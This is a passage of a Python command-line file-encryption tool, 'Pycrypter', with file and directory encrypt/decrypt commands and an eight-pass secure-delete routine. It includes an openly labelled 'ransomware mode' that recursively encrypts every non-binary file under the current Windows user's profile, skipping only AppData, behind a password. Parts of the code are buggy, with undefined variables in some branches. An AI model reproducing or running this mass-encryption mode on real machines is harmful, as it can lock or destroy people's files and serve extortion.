				args1 = encryption_arguments.replace("-dr ", "")
				argument_directories = args1.replace("--directory ", "")
				
				directories = tokenize(argument_directories)
				
				password = getpass.getpass("Enter a password: ")
				
				sys.stdout.write("|-------------------------------------------------------------|\n")
				sys.stdout.flush()
				
				if directories:
					main.cipher_directory(
						directories,
						verbose=True,
						password=password,
						keep_copy=keep_copy,
						cipher_method="encrypt"
					)
			debug_info()
		
		if "decrypt " in command.lower():
			decryption_arguments = command.replace("decrypt ", "").lower()
			keep_copy = False
			
			if "-c " in decryption_arguments or "--keep-copy " in decryption_arguments:
				keep_copy = True
				
				args1 = decryption_arguments.replace("-c ", '')
				decryption_arguments = args1.replace("--keep_copy ", '')
				
			if "-rw" in decryption_arguments or "--ransomware" in decryption_arguments:
				args1 = decryption_arguments.replace("-rw", "")
				decryption_arguments = args1.replace("--ransomware", "")
				
				dir_list = [
					f"C:\\MyPython\\hmm"
				]
				
				skip_dirs = [
					f"C:\\Users\\{current_user}\\AppData"
				]
				
				password = getpass.getpass("Enter a password: ")
				
				sys.stdout.write("|-------------------------------------------------------------|\n")
				sys.stdout.flush()
				
				main.ransomware(
					dir_list,
					skip_directories=skip_dirs,
					verbose=True,
					password=password,
					keep_copy=keep_copy,
					cipher_method="decrypt"
				)
				
				debug_info()
				continue
				
			if "-f " in decryption_arguments or "--file " in decryption_arguments:
				args1 = decryption_arguments.replace("-f ", "")
				argument_files = args1.replace("--file ", "")
				
				files = tokenize(argument_files)
				
				password = getpass.getpass("Enter a password: ")
				
				sys.stdout.write("|-------------------------------------------------------------|\n")
				sys.stdout.flush()
				
				if files:
					main.cipher_file(
						files,
						verbose=True,
						password=password,
						keep_copy=keep_copy,
						cipher_method="decrypt"
					)
			if "-dr " in decryption_arguments or "--directory " in decryption_arguments:
				args1 = decryption_arguments.replace("-dr ", "")
				argument_directories = args1.replace("--directory ", "")
				
				directories = tokenize(argument_directories)
				
				password = getpass.getpass("Enter a password: ")
				
				sys.stdout.write("|-------------------------------------------------------------|\n")
				sys.stdout.flush()
				
				if directories:
					main.cipher_directory(
						directories,
						verbose=True,
						password=password,
						keep_copy=keep_copy,
						cipher_method="decrypt"
					)
			debug_info()
			
		if "safedel " in command.lower():
			safedel_arguments = command.replace("safedel ", "").lower()
			
			files = tokenize(safedel_arguments)
			confirm = input("Do you wish to continue? This process will be irriversible. [Y/N]: ")
			
			if confirm.lower() == "y":
				pass
			else:
				print("safedel canceled, returning. . .")
				continue
			
			print(files)
			
			for current_file, file_to_delete in enumerate(files):
				set_progress_bar = False
				
				symbols = ['\\', '|', '/', '-']
				i = 0
					
				interactive[f"{files[current_file]} | parse_complete"] = False
				
				for iteration in range(8):
					interactive[f"{files[current_file]} | pass{iteration + 1}_complete"] = False
				
				def file_overwrite(file_path, file_size):
					with open(file_path, 'wb') as file:
						original_size = file_size
						
						# Overwrite with a random bytearray
						chunk = 50 * 1024 * 1024
						
						for pass_iteration in range(8):
							file_size = original_size
							chunk_data = None
							
							while file_size > 0:
								chunk = min(file_size, 50 * 1024 * 1024)
								
								if pass_iteration == 0:
									chunk_data = bytearray([0x00, 0x00]) # First pass
								
								elif pass_iteration == 1:
									chunk_data = bytearray([0xFF, 0xFF]) # Second pass
								
								elif pass_iteration == 2:
									chunk_data = bytearray([0x55, 0xAA]) # Third pass
									
								elif pass_iteration == 3:
									chunk_data = bytearray([0xAA, 0x55]) # Fourth pass
								
								else:
									chunk_data = os.urandom(2) # All other passes
								
								file.write(chunk_data * chunk)
								file_size -= chunk
							
							interactive[f"{files[current_file]} | pass{pass_iteration + 1}_complete"] = True
						
						file.truncate(0)
					
					# Delete the file
					os.unlink(file_path)
				
				current_file_size = os.path.getsize(files[current_file])
				
				thread = thread_create(
					callback = encrypt_file,
					input_file = files[current_file], 
					password = os.urandom(64),
					keep_copy = False,
					safedel_overwrite=True
				)
				
				total_start_time = time.time()
				
				print(f"\n{files[current_file]}: ")
				start_time = time.perf_counter()
				
				while True:
					if cleanup_status:
						sys.stdout.write(f"\rwaiting for encryption to finish. . . stopped\n\n")
						break
					
					if interactive[f"{files[current_file]} | parse_complete"] == True:
						end_time = time.perf_counter()
						sys.stdout.write(f"\rwaiting for encryption to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
						
						break
					
					sys.stdout.write(f"\rwaiting for encryption to finish. . . {symbols[i]}")
					i = (i + 1) % len(symbols)
					
					time.sleep(0.1)
				
				thread = thread_create(
					callback = file_overwrite,
					file_path = files[current_file],
					file_size = current_file_size
				)
				
				current_pass = 1
				start_time = time.perf_counter()
				
				while True:
					if cleanup_status:
						sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
						break
					
					if interactive[f"{files[current_file]} | pass{current_pass}_complete"] == True:
						end_time = time.perf_counter()
						sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
						
						current_pass += 1
						
						if current_pass == 8:
							break
						
						start_time = time.perf_counter()
						continue
					
					sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . {symbols[i]}")
					i = (i + 1) % len(symbols)
					
					time.sleep(0.1)
				
				total_end_time = time.time()
				print(f"total time elapsed for {files[current_file]}: {(total_end_time - total_start_time):.2f} seconds\n")
			
		...

class Main:
	def __init__(self):
		# use the global variables
		global threads
		global cleanup_status

		global bar_total
	
		# self.parser objects
		self.args = None
		
		self.parser = argparse.ArgumentParser(description=f'Pycrypter CLI by NewGuy103. v{pycrypter_version}')

		self.parser.add_argument(
			'-i', '--interactive',
			action="store_true",
			help="pycrypter's interactive CLI mode"
		)
		
		self.parser.add_argument(
			'-rw', '--ransomware',
			action="store_true",
			help="Ransomware mode, encrypts important user files."
		)

		self.parser.add_argument(
			'-e', '--encrypt',
			action="store_true",
			help='Encryption switch.'
		)

		self.parser.add_argument(
			'-d', '--decrypt',
			action="store_true",
			help='Decryption switch.'
		)

		self.parser.add_argument(
			'-ds', "--deep-search",
			action="store_true",
			help='If specified, search the sub-folders of the directory specified.'
		)

		self.parser.add_argument(
			'-c', "--keep-copy",
			action="store_true",
			help='If specified, keep a copy of the encrypted/decrypted file.'
		)

		self.parser.add_argument(
			'-v', "--verbose",
			action="store_true",
			help='Show the output to the command-line.'
		)

		self.parser.add_argument(
			'-t', '--threads',
			metavar='int',
			nargs="?",
			type=int,
			help="Sets the maximum amount of files to process in memory."
		)

		self.parser.add_argument(
			'-f', "--file",
			metavar='input_file',
			type=str,
			nargs="+",
			help='File path(s) to specify.'
		)

		self.parser.add_argument(
			'-dr', "--directory",
			metavar='input_dir',
			type=str,
			nargs="+",
			help='Directory path(s) to specify.'
		)
	
	def parse_args(self):
		main = Main()
		
		self.args = self.parser.parse_args()
		
		# Guard clauses
		if self.args.interactive:
			while not cleanup_status:
				try:
					pycrypter_interactive()
				except Exception as err:
					err_name = type(err).__name__
					
					print(f"An unexpected error occured! Restarting pycrypter interactive mode. . .\n")
					traceback.print_exc()
			
			return
		
		if self.args.threads:
			threads_max(args.threads)
		
		if self.args.encrypt and self.args.decrypt:
			raise ArgumentError("Both encryption and decryption switches cannot be enabled!\nType -h/--help for help.")

		if not self.args.encrypt and not self.args.decrypt:
			raise ArgumentError("Neither encryption nor decryption switches aren't specified!\nType -h/--help for help.")
		
		atexit.register(debug_info)
		
		if self.args.ransomware:
			cipher_method = "encrypt" if self.args.encrypt else "decrypt"
			
			main.ransomware(
				f"C:\\Users\\{current_user}",
				verbose=self.args.verbose,
				password=password,
				keep_copy=self.args.keep_copy,
				cipher_method=cipher_method
			)
			sys.exit()

		if self.args.file is None and self.args.directory is None:
			raise ArgumentError("No file/directory specified!\nType -h/--help for help.")
		
		password = getpass.getpass("Enter a password: ")
		
		cipher_method = "encrypt" if self.args.encrypt else "decrypt"
		
		sys.stdout.write("|-------------------------------------------------------------|\n")
		sys.stdout.flush()
		
		if self.args.file:
			main.cipher_file(
				self.args.file,
				verbose=self.args.verbose,
				password=password,
				keep_copy=self.args.keep_copy,
				cipher_method=cipher_method
			)
		
		if self.args.directory:
			main.cipher_directory(
				self.args.directory,
				verbose=self.args.verbose,
				password=password,
				keep_copy=self.args.keep_copy,
				cipher_method=cipher_method
			)
	
	def ransomware(self, directories, skip_directories=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		global files_count
		global files_finished
		global files_exception_thrown
		
		global bar_total
		
		if cipher_method not in ["encrypt", "decrypt"]:
			raise ValueError("Cipher method must be \"encrypt\" or \"decrypt\"")
		
		files = []
		folders = []
		files_errorlist = []
		
		for folder in directories:
			if find_dir(folder):
				folders.append(folder)
				continue
			
			if os.path.isfile(folder):
				dir_errors.append(f"-rw | Directory \"{folder}\" is a file!")
			elif len(directories) > 1:
				# Don't throw an error for mass searching
				dir_errors.append(f"-rw | Directory \"{folder}\" isn't a directory!")
			else:
				# Throw an error if less than two directories are being processed
				dir_errors.append(f"-rw | Directory \"{folder}\" isn't a directory!")

				raise NotADirectoryError(f"Directory \"{folder}\" isn't a directory!")
		
		for i, folder in enumerate(folders):
			files = iterate_dir(folder, iterate_tree=True, skip_dirs=skip_directories)

		for i, file in enumerate(files):
			files_count += 1

			file_name, file_ext = os.path.splitext(file)
			file_size = os.path.getsize(file)

			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | Binary file")
				files.remove(file)
				continue
			elif file_size > memory_max_allocated:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | File too large")
				files.remove(file)
				continue

		bar_total = files_count
		
		for i, file in enumerate(files):
			if cleanup_status:
				break

			if cipher_method == "encrypt":
				thread = thread_create(
					callback = encrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)
			elif cipher_method == "decrypt":
				thread = thread_create(
					callback = decrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)
		
		while len(threads) > 0:
			time.sleep(0.05)

			if cleanup_status:
				break

		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
			print(f"Total files [processed] : {files_finished}\n")

			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")

			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")

			# File and directory errors
			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")

			for err in files_errorlist:
				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	
	# Check each file/directory
	def cipher_file(self, file_list, skip_files=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		global files_count
		global files_finished
		global files_exception_thrown
		
		global bar_total
		
		if cipher_method not in ["encrypt", "decrypt"]:
			raise ValueError("Cipher method must be \"encrypt\" or \"decrypt\"")
		
		files = []
		files_errorlist = []

		for file in file_list:
			if find_file(file):
				files.append(file)
				continue

			if os.path.isdir(file):
				file_errors.append(f"-f | File \"{file}\" is a directory!")
			elif len(files) > 1:
				# Don't throw an error for mass searching
				file_errors.append(f"-f | File \"{file}\" isn't a file!")
			else:
				# Throw an error if less than two files are being processed
				file_errors.append(f"-f | File \"{file}\" isn't a file!")

				raise FileNotFoundError(f"File \"{file}\" isn't a file!")

		for i, file in enumerate(files):
			files_count += 1

			file_name, file_ext = os.path.splitext(file)
			file_size = os.path.getsize(file)

			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | Binary file")
				files.remove(file)
				continue
			elif file_size > memory_max_allocated:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | File too large")
				files.remove(file)
				continue

		bar_total = files_count
		for i, file in enumerate(files):
			if cleanup_status:
				break

			if cipher_method == "encrypt":
				thread = thread_create(
					callback = encrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)
			elif cipher_method == "decrypt":
				thread = thread_create(
					callback = decrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)

		while len(threads) > 0:
			time.sleep(0.05)

			if cleanup_status:
				break

		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
			print(f"Total files [processed] : {files_finished}\n")

			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")

			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")

			# File and directory errors
			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")

			for err in files_errorlist:
				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")

	def cipher_directory(self, directories, skip_directories=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		global files_count
		global files_finished
		global files_exception_thrown
		
		global bar_total
		
		if cipher_method not in ["encrypt", "decrypt"]:
			raise ValueError("Cipher method must be \"encrypt\" or \"decrypt\"")
		
		files = []
		files_errorlist = []

		for folder in directories:
			if find_dir(folder):
				folders.append(folder)
				continue

			if os.path.isfile(folder):
				dir_errors.append(f"-dr | Directory \"{folder}\" is a file!")
			elif len(directories) > 1:
				# Don't throw an error for mass searching
				dir_errors.append(f"-dr | Directory \"{folder}\" isn't a directory!")
			else:
				# Throw an error if less than two directories are being processed
				dir_errors.append(f"-dr | Directory \"{folder}\" isn't a directory!")

				raise NotADirectoryError(f"Directory \"{folder}\" isn't a directory!")

		for i, folder in enumerate(folders):
			files = iterate_dir(folder, args.deep_search)

		for i, file in enumerate(files):
			files_count += 1

			file_name, file_ext = os.path.splitext(file)
			file_size = os.path.getsize(file)

			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | Binary file")
				files.remove(file)
				continue
			elif file_size > memory_max_allocated:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | File too large")
				files.remove(file)
				continue

		bar_total = files_count
		for i, file in enumerate(files):
			if cleanup_status:
				break

			if cipher_method == "encrypt":
				thread = thread_create(
					callback = encrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)
			elif cipher_method == "decrypt":
				thread = thread_create(
					callback = decrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)

		while len(threads) > 0:
			time.sleep(0.05)

			if cleanup_status:
				break

		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
			print(f"Total files [processed] : {files_finished}\n")

			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")

			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")

			# File and directory errors
			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")

			for err in files_errorlist:
				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
		
if __name__ == "__main__":
	main = Main()
	main.parse_args()
